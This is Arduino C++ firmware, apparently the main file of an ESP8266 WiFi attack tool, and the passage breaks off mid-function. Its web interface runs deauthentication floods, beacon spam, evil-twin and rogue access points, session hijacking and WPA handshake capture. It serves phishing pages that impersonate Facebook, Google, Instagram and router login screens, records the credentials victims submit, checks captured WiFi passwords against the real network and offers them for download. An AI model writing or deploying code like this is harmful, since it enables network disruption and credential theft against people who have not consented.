extern "C" {
#include "user_interface.h"
#include <lwip/netif.h>
}

static int ip_forward_enabled = 0;

#include <ESP8266WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <LittleFS.h>
#include <ArduinoJson.h>

#include "config.h"
#include "language.h"
#include "attacks.h"
#include "phishing.h"
#include "webui.h"
#include "websockets.h"
#include "secure_ota.h"

#define ATTACK_TIMER_MAX 7200
#define PHISHING_VERIFY_TIMEOUT 10000

static bool secureCompare(const String& a, const String& b) {
  if (a.length() != b.length()) return false;
  int result = 0;
  for (size_t i = 0; i < a.length(); i++) {
    result |= (a[i] ^ b[i]);
  }
  return result == 0;
}

DNSServer dnsServer;
AsyncWebServer server(80);

uint8_t currentLang = LANG_ENGLISH;
unsigned long startTime = 0;
bool hasCustomHTML = false;
// customHTML removed — read from file on demand to save RAM
int attackTimer = 0;
unsigned long attackTimerStart = 0;

// --- Wear-Leveling State Tracking ---
static SaveGrade pendingSave = SAVE_NONE;

static const char criticalActionTable[] PROGMEM =
  "deauth_start\0deauth_stop\0deauth_all_start\0deauth_all_stop\0"
  "precise_deauth_start\0precise_deauth_stop\0true_deauth_start\0true_deauth_stop\0"
  "beacon_start\0beacon_stop\0probe_start\0probe_stop\0"
  "eviltwin_start\0eviltwin_stop\0hijack_start\0hijack_stop\0"
  "rogue_ap_start\0rogue_ap_stop\0stop_all\0"
  "save_file\0format\0reboot\0reset\0save_ap\0"
  "wifi_connect\0wifi_disconnect\0wifi_sharing_start\0wifi_sharing_stop\0"
  "clear_logs\0clear_probes\0clear_clients\0pin_set\0pin_clear\0"
  "hide_ap\0auto_select";
#define CRITICAL_COUNT 35
#define SENSITIVE_COUNT 27

static bool stringInTable(const String& a, const char table[], int count) {
  const char* p = table;
  for (int i = 0; i < count; i++) {
    if (strcmp_P(a.c_str(), p) == 0) return true;
    p += strlen_P(p) + 1;
  }
  return false;
}

static void markSave(SaveGrade grade) {
  if (grade > pendingSave) pendingSave = grade;
}

void internetSharing(bool enable) {
  if (enable && wifiClientConnected && WiFi.status() == WL_CONNECTED) {
    if (!ip_forward_enabled) {
      ip_forward_enabled = 1;
      IPAddress gw = WiFi.gatewayIP();
      WiFi.softAPConfig(AP_IP, gw, IPAddress(255,255,255,0));
      dnsServer.stop();
      dnsServer.start(DNS_PORT, "*", AP_IP);
      addLog("Internet sharing ENABLED via " + gw.toString());
      addLog("NOTE: Enable LWIP_IP_FORWARD in lwipopts.h for real NAT", LOG_WARN);
    }
  } else {
    if (ip_forward_enabled) {
      ip_forward_enabled = 0;
      WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255,255,255,0));
      addLog("Internet sharing DISABLED");
    }
  }
  dirtyState = true;
}

void stopAllAttacks() {
  deauthingActive = false; beaconActive = false; probeActive = false;
  hijackActive = false; deauthAllActive = false;
  preciseDeauthActive = false; trueDeauthActive = false; rogueAPActive = false;
  phishingVerifyState = PHISHING_VERIFY_IDLE;
  if (hotspotActive) stopEvilTwin(&dnsServer);
  addLog("All attacks stopped", LOG_WARN);
  dirtyState = true;
}

String getWifiClientTableRows() {
  String rows;
  for (int i = 0; i < MAX_NETWORKS; i++) {
    if (networks[i].ssid == "") break;
    String bssidStr = bytesToStr(networks[i].bssid, 6);
    rows += "<tr><td>" + htmlEntities(networks[i].ssid) + "</td><td>" + bssidStr + "</td>";
    rows += "<td>" + String(networks[i].ch) + "</td><td>" + String(networks[i].rssi) + "</td>";
    rows += "<td>" + String(networks[i].wpa3 ? "WPA3" : (networks[i].encrypted ? "SEC" : "OPEN")) + "</td>";
    rows += "<td>" + getVendor(networks[i].bssid) + "</td></tr>";
  }
  return rows;
}

String getTableRows() {
  String rows;
  for (int i = 0; i < MAX_NETWORKS; i++) {
    if (networks[i].ssid == "") break;
    String bssidStr = bytesToStr(networks[i].bssid, 6);
    bool isSelected = (memcmp(networks[i].bssid, selectedNetwork.bssid, 6) == 0 && selectedNetwork.ssid.length() > 0);
    bool isMulti = false;
    for (int m = 0; m < multiTargetCount; m++) {
      if (memcmp(networks[i].bssid, multiTargets[m].bssid, 6) == 0) { isMulti = true; break; }
    }
    String tag = isSelected ? " <span class='badge'>SEL</span>" : (isMulti ? " <span class='badge'>M</span>" : "");
    if (networks[i].wpa3) tag += " <span class='badge' style='border-color:#ff0;color:#ff0'>WPA3</span>";
    String secStr = networks[i].wpa3 ? "WPA3" : (networks[i].encrypted ? "WPA2" : "OPEN");
    rows += "<tr><td>" + htmlEntities(networks[i].ssid) + tag + "</td><td>" + bssidStr + "</td>";
    rows += "<td>" + String(networks[i].ch) + "</td><td>" + String(networks[i].rssi) + "</td>";
    rows += "<td>" + secStr + "</td>";
    rows += "<td>" + getVendor(networks[i].bssid) + "</td>";
    rows += "<td><a class='btn' href='/?select=" + bssidStr + "'>SEL</a>";
    rows += " <a class='btn' href='/?multi_add=" + bssidStr + "'>+M</a></td></tr>";
  }
  return rows;
}

String getCapturedList() {
  String list;
  for (int i = 0; i < capturedCount; i++) {
    list += "<div class='capture-box'><span class='pw'>" + htmlEntities(capturedPasswords[i]) + "</span></div>";
  }
  return list;
}

String getFileList() {
  String list;
  Dir dir = LittleFS.openDir("/");
  while (dir.next()) {
    String fn = dir.fileName();
    list += "<tr><td>" + htmlEntities(fn) + "</td><td>" + String(dir.fileSize()) + " B</td>";
    list += "<td style='text-align:center;'><button class='btn' style='display:inline-block;border-color:var(--accent);color:var(--accent);' onclick=\"selectFile('" + htmlEntities(fn) + "')\">SELECT</button></td></tr>";
  }
  return list;
}

String getProbeHTML() {
  String h;
  for (int i = 0; i < probeCount; i++) {
    String mac = bytesToStr(probeLog[i].mac, 6);
    h += "<div class='capture-box'>" + htmlEntities(mac) + " → " + htmlEntities(probeLog[i].ssid) + "</div>";
  }
  if (h.length() == 0) h = "<div class='empty'>No probe requests captured</div>";
  return h;
}

String getClientHTML() {
  String h;
  for (int i = 0; i < clientCount; i++) {
    String mac = bytesToStr(clientList[i].mac, 6);
    h += "<div class='capture-box'>" + htmlEntities(mac) + "</div>";
  }
  if (h.length() == 0) h = "<div class='empty'>No clients detected</div>";
  return h;
}

String getDNSLogHTML() {
  String h;
  for (int i = 0; i < dnsLogCount; i++) {
    String mac = bytesToStr(dnsLog[i].clientMAC, 6);
    h += "<div class='capture-box'>" + htmlEntities(mac) + " → " + htmlEntities(dnsLog[i].domain) + "</div>";
  }
  if (h.length() == 0) h = "<div class='empty'>No DNS queries yet</div>";
  return h;
}

String getLangTable() {
  String rows;
  for (int i = 0; i < langCount; i++) {
    rows += "<tr><td>" + String(langTable[i].key) + "</td><td>" + String(langTable[i].en) + "</td><td>" + String(langTable[i].id) + "</td></tr>";
  }
  return rows;
}

void savePhishingPages() {
}

void saveBeaconSSIDs() {
  File f = LittleFS.open("/beacons.txt", "w");
  if (!f) return;
  for (int i = 0; i < beaconSSIDCount; i++) {
    f.println(beaconSSIDs[i]);
  }
  f.close();
}

void loadBeaconSSIDs() {
  if (!LittleFS.exists("/beacons.txt")) return;
  File f = LittleFS.open("/beacons.txt", "r");
  if (!f) return;
  beaconSSIDCount = 0;
  while (f.available() && beaconSSIDCount < MAX_SSIDS) {
    String line = f.readStringUntil('\n');
    line.trim();
    if (line.length() > 0) beaconSSIDs[beaconSSIDCount++] = line;
  }
  f.close();
}

// --- JSON State Save/Load ---
void saveState() {
  StaticJsonDocument<1024> doc;
  doc["v"] = STATE_CFG_VERSION;
  doc["deauth"] = deauthingActive;
  doc["beacon"] = beaconActive;
  doc["probe"] = probeActive;
  doc["hijack"] = hijackActive;
  doc["deauthAll"] = deauthAllActive;
  doc["preciseDeauth"] = preciseDeauthActive;
  doc["trueDeauth"] = trueDeauthActive;
  doc["rogueAP"] = rogueAPActive;
  doc["extender"] = extenderActive;
  doc["wifi"] = wifiClientConnected;
  doc["wifiSSID"] = wifiClientSSID;
  doc["wifiPass"] = encryptString(wifiClientPassword);
  doc["internetSharing"] = internetSharingEnabled;
  doc["lang"] = currentLang;
  doc["phishingPage"] = currentPhishingPage;
  doc["displayTimeout"] = displayTimeout;
  doc["autoSelect"] = autoSelectAll;
  doc["attackTimer"] = attackTimer;
  doc["apHidden"] = apHidden;
  doc["selSSID"] = selectedNetwork.ssid;
  doc["selCH"] = selectedNetwork.ch;
  JsonArray bssidArr = doc.createNestedArray("selBSSID");
  for (int i = 0; i < MAC_LEN; i++) bssidArr.add(selectedNetwork.bssid[i]);
  doc["webPin"] = encryptString(webPin);
  doc["phishingStep"] = phishingStep;

  File f = LittleFS.open("/state.json.tmp", "w");
  if (!f) return;
  serializeJson(doc, f);
  f.close();
  LittleFS.remove(STATE_CFG_FILE);
  LittleFS.rename("/state.json.tmp", STATE_CFG_FILE);
}

void loadState() {
  if (!LittleFS.exists(STATE_CFG_FILE)) return;
  File f = LittleFS.open(STATE_CFG_FILE, "r");
  if (!f) return;
  StaticJsonDocument<1024> doc;
  DeserializationError err = deserializeJson(doc, f);
  f.close();
  if (err) {
    addLog("State JSON parse error, using defaults", LOG_WARN);
    return;
  }
  int ver = doc["v"] | 0;
  deauthingActive = doc["deauth"] | false;
  beaconActive = doc["beacon"] | false;
  probeActive = doc["probe"] | false;
  hijackActive = doc["hijack"] | false;
  deauthAllActive = doc["deauthAll"] | false;
  preciseDeauthActive = doc["preciseDeauth"] | false;
  trueDeauthActive = doc["trueDeauth"] | false;
  rogueAPActive = doc["rogueAP"] | false;
  extenderActive = doc["extender"] | false;
  wifiClientConnected = doc["wifi"] | false;
  wifiClientSSID = doc["wifiSSID"] | "";
  wifiClientPassword = decryptString(doc["wifiPass"] | "");
  internetSharingEnabled = doc["internetSharing"] | false;
  currentLang = doc["lang"] | LANG_ENGLISH;
  currentPhishingPage = doc["phishingPage"] | PHISHING_LANDING;
  displayTimeout = doc["displayTimeout"] | 60;
  autoSelectAll = doc["autoSelect"] | false;
  attackTimer = doc["attackTimer"] | 0;
  apHidden = doc["apHidden"] | false;
  selectedNetwork.ssid = doc["selSSID"] | "";
  selectedNetwork.ch = doc["selCH"] | 0;
  JsonArray bssidArr = doc["selBSSID"].as<JsonArray>();
  if (bssidArr.size() == MAC_LEN) {
    for (int i = 0; i < MAC_LEN; i++) selectedNetwork.bssid[i] = bssidArr[i];
  }
  webPin = decryptString(doc["webPin"] | "");
  phishingStep = doc["phishingStep"] | 0;
  addLog("State restored v" + String(ver));
}

// --- Async Route Handlers ---
#define CONTENT_HTML F("text/html")
#define CONTENT_PLAIN F("text/plain")
#define CONTENT_JSON F("application/json")

static bool checkPin(AsyncWebServerRequest *request, const String& action) {
  if (webPin.length() > 0 && !pinUnlocked && stringInTable(action, criticalActionTable, SENSITIVE_COUNT)) {
    request->send(200, F("text/html"), buildPinPage(currentLang, pinAttempts, pinLockoutUntil > 0));
    return false;
  }
  return true;
}

void handleRoot(AsyncWebServerRequest *request) {
  if (request->hasArg("select")) {
    String bssidStr = request->arg("select");
    for (int i = 0; i < MAX_NETWORKS; i++) {
      if (bytesToStr(networks[i].bssid, 6) == bssidStr) {
        if (!hotspotActive && !rogueAPActive) selectedNetwork = networks[i];
        dirtyState = true;
        markSave(SAVE_CRITICAL);
        if (deauthingActive) deauthingActive = false;
        if (beaconActive) beaconActive = false;
        if (probeActive) probeActive = false;
        if (hotspotActive) stopEvilTwin(&dnsServer);
        addLog("Selected: " + networks[i].ssid.substring(0, 20));
        applyAdaptiveRoguePower(networks[i].rssi);

        if (autoSelectAll) {
          uint8_t oui[3];
          memcpy(oui, networks[i].bssid, 3);
          for (int j = 0; j < MAX_NETWORKS; j++) {
            if (networks[j].ssid.length() == 0) continue;
            if (memcmp(networks[j].bssid, oui, 3) != 0) continue;
            if (memcmp(networks[j].bssid, networks[i].bssid, 6) == 0 && networks[j].ssid == networks[i].ssid) continue;
            bool already = false;
            for (int m = 0; m < multiTargetCount; m++) {
              if (memcmp(networks[j].bssid, multiTargets[m].bssid, 6) == 0) { already = true; break; }
            }
            if (!already && multiTargetCount < MAX_NETWORKS) {
              multiTargets[multiTargetCount++] = networks[j];
              addLog("Auto-added: " + networks[j].ssid);
            }
          }
        }
        break;
      }
    }
  }

  if (request->hasArg("multi_add")) {
    String bssidStr = request->arg("multi_add");
    for (int i = 0; i < MAX_NETWORKS; i++) {
      if (bytesToStr(networks[i].bssid, 6) == bssidStr) {
        bool already = false;
        for (int m = 0; m < multiTargetCount; m++) {
          if (memcmp(networks[i].bssid, multiTargets[m].bssid, 6) == 0) { already = true; break; }
        }
        if (!already && multiTargetCount < MAX_NETWORKS) {
          multiTargets[multiTargetCount++] = networks[i];
          addLog("Multi-target added: " + networks[i].ssid);
        }
        break;
      }
    }
  }

  if (request->hasArg("multi_clear")) {
    multiTargetCount = 0;
    addLog("Multi-target list cleared");
  }

  if (request->hasArg("delete")) {
    String fn = request->arg("delete");
    if (LittleFS.exists(fn)) { LittleFS.remove(fn); addLog("Deleted: " + fn); }
  }

  if (pinUnlocked && webPin.length() > 0 && millis() - pinUnlockTime > PIN_SESSION_MS) {
    pinUnlocked = false;
    addLog("PIN session expired");
  }

  if (pinLockoutUntil > 0 && millis() >= pinLockoutUntil) {
    pinAttempts = 0;
    pinLockoutUntil = 0;
  }

  if (request->hasArg("action")) {
    String a = request->arg("action");

    if (a == "pin_set" && request->hasArg("val")) {
      String newPin = sanitizeNumeric(request->arg("val"));
      if (newPin.length() >= 4 && newPin.length() <= 8) {
        webPin = newPin;
        pinUnlocked = true;
        pinUnlockTime = millis();
        dirtyState = true;
        markSave(SAVE_CRITICAL);
        addLog("PIN set");
      }
    }
    else if (a == "pin_clear") {
      webPin = "";
      pinUnlocked = false;
      dirtyState = true;
      markSave(SAVE_CRITICAL);
      addLog("PIN cleared");
    }
    else if (a == "pin_verify" && request->hasArg("val")) {
      if (pinLockoutUntil > 0) { addLog("PIN locked out", LOG_WARN); }
      else if (secureCompare(request->arg("val"), webPin)) {
        pinUnlocked = true;
        pinAttempts = 0;
        pinUnlockTime = millis();
        addLog("PIN verified");
      } else {
        pinAttempts++;
        addLog("PIN failed (" + String(pinAttempts) + "/" + String(PIN_MAX_ATTEMPTS) + ")", LOG_WARN);
        if (pinAttempts >= PIN_MAX_ATTEMPTS) {
          pinLockoutUntil = millis() + PIN_LOCKOUT_MS;
          pinUnlocked = false;
          addLog("PIN locked out 30s", LOG_ERR);
        }
      }
    }

    if (!checkPin(request, a)) return;

    if (a == "deauth_start" && selectedNetwork.ssid.length() > 0) {
      if (shouldUseAlternativeAttack(selectedNetwork)) {
        addLog("PMF detected on target, using CSA + BSS Transition", LOG_WARN);
        uint8_t fakeBSSID[6];
        genRandomMAC(fakeBSSID);
        sendCSA(selectedNetwork.ch, selectedNetwork.bssid, selectedNetwork.ssid,
                (selectedNetwork.ch % 13) + 1);
        sendBSSTransitionRequest(selectedNetwork.ch, selectedNetwork.bssid, fakeBSSID, fakeBSSID);
        beaconActive = true;
        rogueAPActive = true;
        startEvilTwin(&dnsServer, selectedNetwork.ssid);
      } else {
        deauthingActive = true;
      }
      dirtyState = true;
      markSave(SAVE_CRITICAL);
      addLog("Deauth started");
    }
    else if (a == "deauth_stop") { deauthingActive = false; dirtyState = true; markSave(SAVE_CRITICAL); addLog("Deauth stopped"); }
    else if (a == "beacon_start") { beaconActive = true; dirtyState = true; markSave(SAVE_CRITICAL); addLog("Beacon started"); }
    else if (a == "beacon_stop") { beaconActive = false; dirtyState = true; markSave(SAVE_CRITICAL); addLog("Beacon stopped"); }
    else if (a == "probe_start") { probeActive = true; dirtyState = true; markSave(SAVE_CRITICAL); addLog("Probe started"); }
    else if (a == "probe_stop") { probeActive = false; dirtyState = true; markSave(SAVE_CRITICAL); addLog("Probe stopped"); }
    else if (a == "eviltwin_start" && selectedNetwork.ssid.length() > 0) {
      startEvilTwin(&dnsServer, selectedNetwork.ssid);
      applyAdaptiveRoguePower(selectedNetwork.rssi);
      addLog("Evil-Twin started: " + selectedNetwork.ssid);
      dirtyState = true;
      markSave(SAVE_CRITICAL);
    }
    else if (a == "eviltwin_stop") { stopEvilTwin(&dnsServer); addLog("Evil-Twin stopped"); dirtyState = true; markSave(SAVE_CRITICAL); }
    else if (a == "hijack_start" && selectedNetwork.ssid.length() > 0) {
      if (!hijackActive) { startSessionHijack(selectedNetwork.bssid, selectedNetwork.ch); addLog("Hijack started"); }
      dirtyState = true;
      markSave(SAVE_CRITICAL);
    }
    else if (a == "hijack_stop") { if (hijackActive) { stopSessionHijack(); addLog("Hijack stopped"); } dirtyState = true; markSave(SAVE_CRITICAL); }
    else if (a == "deauth_all_start") { deauthAllActive = true; dirtyState = true; markSave(SAVE_CRITICAL); addLog("Deauth-all started"); }
    else if (a == "deauth_all_stop") { deauthAllActive = false; dirtyState = true; markSave(SAVE_CRITICAL); addLog("Deauth-all stopped"); }
    else if (a == "precise_deauth_start") { preciseDeauthActive = true; dirtyState = true; markSave(SAVE_CRITICAL); addLog("Precise deauth started"); }
    else if (a == "precise_deauth_stop") { preciseDeauthActive = false; dirtyState = true; markSave(SAVE_CRITICAL); addLog("Precise deauth stopped"); }
    else if (a == "true_deauth_start") { trueDeauthActive = true; dirtyState = true; markSave(SAVE_CRITICAL); addLog("True deauth started"); }
    else if (a == "true_deauth_stop") { trueDeauthActive = false; dirtyState = true; markSave(SAVE_CRITICAL); addLog("True deauth stopped"); }
    else if (a == "rogue_ap_start") {
      rogueAPActive = true;
      startEvilTwin(&dnsServer, "Free WiFi");
      applyAdaptiveRoguePower(targetAP_RSSI);
      if (wifiClientConnected && WiFi.status() == WL_CONNECTED) {
        internetSharingEnabled = true; internetSharing(true);
        addLog("Rogue AP + internet sharing");
      } else { addLog("Rogue AP started (no internet)"); }
      dirtyState = true;
      markSave(SAVE_CRITICAL);
    }
    else if (a == "rogue_ap_stop") { rogueAPActive = false; stopEvilTwin(&dnsServer); dirtyState = true; markSave(SAVE_CRITICAL); }
    else if (a == "stop_all") { stopAllAttacks(); markSave(SAVE_CRITICAL); }
    else if (a == "reboot") { request->send(200, CONTENT_PLAIN, "OK"); ESP.restart(); return; }
    else if (a == "reset") {
      stopAllAttacks();
      WiFi.softAPdisconnect(true); delay(100);
      if (internetSharingEnabled) internetSharing(false);
      WiFi.disconnect();
      WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255,255,255,0));
      WiFi.softAP(AP_SSID, AP_PASS);
      wifiClientConnected = false; wifiClientSSID = ""; wifiClientPassword = "";
      wifiClientStatus = WL_DISCONNECTED; internetSharingEnabled = false;
      probeCount = 0; clientCount = 0; capturedCount = 0;
      dirtyState = true; markSave(SAVE_CRITICAL); addLog("Factory reset done");
    }
    else if (a == "format") { LittleFS.format(); hasCustomHTML = false; addLog("Filesystem formatted"); }
    else if (a == "use_custom") { currentPhishingPage = PHISHING_CUSTOM; dirtyState = true; markSave(SAVE_NONCRITICAL); }
    else if (a == "use_custom_file" && request->hasArg("file")) {
      currentPhishingPage = PHISHING_CUSTOM;
      String fn = request->arg("file");
      if (!fn.startsWith("/")) fn = "/" + fn;
      hasCustomHTML = LittleFS.exists(fn);
      dirtyState = true;
      markSave(SAVE_NONCRITICAL);
    }
    else if (a == "page") { currentPhishingPage = request->arg("page").toInt(); dirtyState = true; markSave(SAVE_NONCRITICAL); }
    else if (a == "wifi_scan") { performScan(); addLog("WiFi scan done"); }
    else if (a == "wifi_connect" && request->hasArg("wifi_ssid") && request->hasArg("wifi_pass")) {
      wifiPendingSSID = request->arg("wifi_ssid");
      wifiPendingPass = request->arg("wifi_pass");
      WiFi.disconnect(); delay(100);
      WiFi.begin(wifiPendingSSID.c_str(), wifiPendingPass.c_str());
      wifiConnState = WIFI_CONNECTING;
      wifiConnectStart = millis();
      addLog("Connecting to " + wifiPendingSSID + " (async)");
    }
    else if (a == "wifi_disconnect") {
      if (internetSharingEnabled) internetSharing(false);
      WiFi.disconnect(); wifiConnState = WIFI_IDLE;
      wifiClientConnected = false; wifiClientSSID = ""; wifiClientPassword = "";
      wifiClientStatus = WL_DISCONNECTED; internetSharingEnabled = false;
      addLog("WiFi disconnected");
      dirtyState = true; markSave(SAVE_CRITICAL);
    }
    else if (a == "wifi_sharing_start") { internetSharingEnabled = true; internetSharing(true); }
    else if (a == "wifi_sharing_stop") { internetSharingEnabled = false; internetSharing(false); }
    else if (a == "count_stations") {
      performScan();
      int c = 0; for (int i = 0; i < MAX_NETWORKS; i++) { if (networks[i].ssid.length() > 0) c++; }
      addLog("Found " + String(c) + " networks, " + String(probeCount) + " probes, " + String(clientCount) + " clients");
    }
    else if (a == "capture_handshake") {
      if (selectedNetwork.ssid.length() > 0) {
        handshakeCaptureActive = true;
        handshakeComplete = false;
        eapolCount = 0;
        memcpy(handshakeTargetBSSID, selectedNetwork.bssid, 6);
        handshakeTargetCH = selectedNetwork.ch;
        handshakeCaptureStart = millis();
        wifi_set_channel(selectedNetwork.ch);
        addLog("Handshake capture started on " + selectedNetwork.ssid + " ch" + String(selectedNetwork.ch));
      } else addLog("Select target first");
    }
    else if (a == "deep_scan") {
      addLog("Deep scan (3 passes)");
      for (int i = 0; i < 3; i++) { performScan(); delay(500); }
    }
    else if (a == "rename" && request->hasArg("file") && request->hasArg("name")) {
      String oldFn = sanitizeFilename(request->arg("file"));
      String newFn = sanitizeFilename(request->arg("name"));
      if (!newFn.startsWith("/")) newFn = "/" + newFn;
      if (LittleFS.exists(oldFn)) { LittleFS.rename(oldFn, newFn); addLog("Renamed: " + oldFn); }
    }
    else if (a == "beacon_add" && request->hasArg("ssid")) {
      String ssid = request->arg("ssid").substring(0, SSID_MAX_LEN);
      if (beaconSSIDCount < MAX_SSIDS && ssid.length() > 0) {
        beaconSSIDs[beaconSSIDCount++] = ssid;
        saveBeaconSSIDs();
        addLog("Beacon SSID added: " + ssid);
      }
    }
    else if (a == "beacon_remove") {
      if (beaconSSIDCount > 0) { beaconSSIDCount--; beaconSSIDs[beaconSSIDCount] = ""; saveBeaconSSIDs(); addLog("Beacon removed"); }
      else addLog("No beacon SSIDs");
    }
    else if (a == "beacon_randomize") {
      beaconSSIDCount = 0;
      for (int i = 0; i < 10; i++) { String r = "AP_" + String(random(1000,9999)); beaconSSIDs[beaconSSIDCount++] = r; }
      saveBeaconSSIDs();
      addLog("10 random beacon SSIDs");
    }
    else if (a == "display_timeout" && request->hasArg("val")) { displayTimeout = sanitizeNumeric(request->arg("val")).toInt(); dirtyState = true; markSave(SAVE_NONCRITICAL); }
    else if (a == "auto_select" && request->hasArg("val")) { autoSelectAll = request->arg("val") == "1"; dirtyState = true; markSave(SAVE_CRITICAL); }
    else if (a == "save_ap" && request->hasArg("ssid") && request->hasArg("pass")) {
      String ns = request->arg("ssid").substring(0, 32), np = request->arg("pass").substring(0, 64);
      if (ns.length() > 0) {
        WiFi.softAPdisconnect(true); delay(100);
        WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255,255,255,0));
        WiFi.softAP(ns.c_str(), np.c_str());
        addLog("AP updated: " + ns);
      }
    }
    else if (a == "clear") { selectedNetwork.ssid = ""; selectedNetwork.ch = 0; for (int i=0;i<6;i++) selectedNetwork.bssid[i]=0; dirtyState = true; markSave(SAVE_CRITICAL); addLog("Target cleared"); }
    else if (a == "hide_ap") {
      apHidden = !apHidden;
      if (apHidden) {
        WiFi.softAPdisconnect(false);
        addLog("AP hidden");
      } else {
        WiFi.softAP(AP_SSID, AP_PASS);
        addLog("AP visible");
      }
      dirtyState = true; markSave(SAVE_CRITICAL);
    }
    else if (a == "extender_scan") {
      extenderState = EXTENDER_SCANNING;
      performScan();
      extenderActive = true;
      extenderState = EXTENDER_IDLE;
      addLog("Extender scan done - " + String(multiTargetCount) + " networks found");
      dirtyState = true;
    }
    else if (a == "clear_logs") {
      logCount = 0; logBuffer = "";
      if (LittleFS.exists("/log.txt")) LittleFS.remove("/log.txt");
      addLog("Logs cleared");
    }
    else if (a == "clear_probes") { probeCount = 0; addLog("Probe log cleared"); }
    else if (a == "clear_clients") { clientCount = 0; addLog("Client list cleared"); }
    else if (a == "save_file" && request->hasArg("file") && request->hasArg("content")) {
      String fn = sanitizeFilename(request->arg("file"));
      String content = request->arg("content");
      if (!fn.startsWith("/")) fn = "/" + fn;
      File f = LittleFS.open(fn, "w");
      if (f) { f.print(content); f.close(); addLog("Saved: " + fn); }
      request->redirect("/edit?file=" + fn);
      return;
    }
    else if (a == "attack_timer" && request->hasArg("val")) {
      attackTimer = sanitizeNumeric(request->arg("val")).toInt();
      if (attackTimer > 0) attackTimerStart = millis();
      else attackTimer = 0;
      addLog("Attack timer: " + String(attackTimer) + "s");
    }
    else if (a == "phishing_step") {
      phishingStep = request->arg("step").toInt();
      addLog("Phishing step: " + String(phishingStep));
    }
    else if (a == "download_captured") {
      String data = "Captured Passwords\n==================\n";
      for (int i = 0; i < capturedCount; i++) data += capturedPasswords[i] + "\n";
      request->send(200, CONTENT_PLAIN, data); return;
    }
    else if (a == "download_log") {
      if (LittleFS.exists("/log.txt")) {
        File f = LittleFS.open("/log.txt", "r");
        String data = f.readString(); f.close();
        request->send(200, CONTENT_PLAIN, data);
      } else request->send(200, CONTENT_PLAIN, "No logs yet");
      return;
    }
    else if (a == "download_config") {
      if (LittleFS.exists(STATE_CFG_FILE)) {
        File f = LittleFS.open(STATE_CFG_FILE, "r");
        String data = f.readString(); f.close();
        request->send(200, CONTENT_PLAIN, data);
      } else request->send(200, CONTENT_PLAIN, "No config");
      return;
    }
    else if (a == "restore_config") {
      request->send(200, CONTENT_HTML, "<html><body><form action='/upload_config' method='post' enctype='multipart/form-data'><input type='file' name='file' required><button type='submit'>RESTORE</button></form><a href='/'>Back</a></body></html>");
      return;
    }
  }

  if (request->hasArg("lang")) { currentLang = request->arg("lang").toInt(); dirtyState = true; markSave(SAVE_NONCRITICAL); }
  if (request->hasArg("page")) { currentPhishingPage = request->arg("page").toInt(); dirtyState = true; markSave(SAVE_NONCRITICAL); }

  if (hotspotActive && phishingStep > 0) {
    String page;
    switch (phishingStep) {
      case PHISHING_FACEBOOK: page = FPSTR(FACEBOOK_HTML); break;
      case PHISHING_TENDA: page = FPSTR(TENDA_HTML); break;
      case PHISHING_GENERIC: page = FPSTR(GENERIC_HTML); page.replace("%SSID%", selectedNetwork.ssid); break;
      case PHISHING_UPDATE: page = FPSTR(UPDATE_HTML); break;
      case PHISHING_GOOGLE: page = FPSTR(GOOGLE_HTML); break;
      case PHISHING_INSTAGRAM: page = FPSTR(INSTAGRAM_HTML); break;
      default: page = FPSTR(LANDING_HTML); break;
    }
    request->send(200, CONTENT_HTML, page); return;
  }

  if (hotspotActive && (request->hasArg("password") || request->hasArg("email") || request->hasArg("username") || request->url() == "/userinput")) {
    String allCreds = "", pwdForConnection = "", extraInfo = "";

    String ua = request->header("User-Agent");
    if (ua.length() > 0) extraInfo = "UA: " + ua.substring(0, 60);
    if (ua.length() > 0) {
      uint8_t autoPage = autoSelectPhishingPage(ua, currentPhishingPage);
      if (autoPage != currentPhishingPage && currentPhishingPage != PHISHING_CUSTOM) {
        currentPhishingPage = autoPage;
        addLog("Auto-selected phishing template for " + String(detectOS(ua) == OS_IOS ? "iOS" :
          detectOS(ua) == OS_ANDROID ? "Android" : detectOS(ua) == OS_WINDOWS ? "Windows" : "Unknown"));
      }
    }

    int argc = request->args();
    for (int i = 0; i < argc; i++) {
      String argName = request->argName(i), argVal = request->arg(i);
      if (argName == "action" || argName == "page" || argName == "lang" || argName == "select") continue;
      allCreds += argName + "=" + argVal + " | ";
      if (argName == "password" || argName == "pass" || argName == "pwd") pwdForConnection = argVal;
    }

    addCapturedPassword(selectedNetwork.ssid, allCreds, extraInfo);
    addLog("Credential captured! " + String(capturedCount) + " total", LOG_WARN);

    if (pwdForConnection.length() > 0 && selectedNetwork.ssid.length() > 0) {
      phishingVerifyState = PHISHING_VERIFYING;
      phishingVerifyStart = millis();
      WiFi.disconnect(); delay(100);
      WiFi.begin(selectedNetwork.ssid.c_str(), pwdForConnection.c_str(), selectedNetwork.ch, selectedNetwork.bssid);
      request->send(200, CONTENT_HTML, FPSTR(VERIFY_HTML));
    } else {
      request->send(200, CONTENT_HTML, FPSTR(RESULT_GOOD_HTML));
    }
    return;
  }

  if (hotspotActive) {
    String page;
    static const char* const fileNames[] = {"/facebook.html", "/tenda.html", "/generic.html", "/update.html", "/landing.html"};
    static const int fileIndices[] = {PHISHING_FACEBOOK, PHISHING_TENDA, PHISHING_GENERIC, PHISHING_UPDATE, PHISHING_LANDING};

    if (currentPhishingPage == PHISHING_CUSTOM && hasCustomHTML) {
      Dir d = LittleFS.openDir("/");
      while (d.next()) {
        String fn = d.fileName();
        if (fn.endsWith(".html") && fn != "/index.html") {
          File f = LittleFS.open(fn, "r");
          if (f) { page = f.readString(); f.close(); page.replace("%SSID%", selectedNetwork.ssid); }
          break;
        }
      }
    }
    if (page.length() == 0) {
      bool loadedFromFile = false;
      for (int fi = 0; fi < 5; fi++) {
        if (currentPhishingPage == (uint8_t)fileIndices[fi] && LittleFS.exists(fileNames[fi])) {
          File f = LittleFS.open(fileNames[fi], "r");
          if (f) { page = f.readString(); f.close(); loadedFromFile = true; }
          break;
        }
      }
      if (!loadedFromFile) {
        switch (currentPhishingPage) {
          case PHISHING_FACEBOOK: page = FPSTR(FACEBOOK_HTML); break;
          case PHISHING_TENDA: page = FPSTR(TENDA_HTML); break;
          case PHISHING_GENERIC: page = FPSTR(GENERIC_HTML); page.replace("%SSID%", selectedNetwork.ssid); break;
          case PHISHING_UPDATE: page = FPSTR(UPDATE_HTML); break;
          case PHISHING_GOOGLE: page = FPSTR(GOOGLE_HTML); break;
          case PHISHING_INSTAGRAM: page = FPSTR(INSTAGRAM_HTML); break;
          case PHISHING_LANDING: default: page = FPSTR(LANDING_HTML); break;
        }
      }
    }
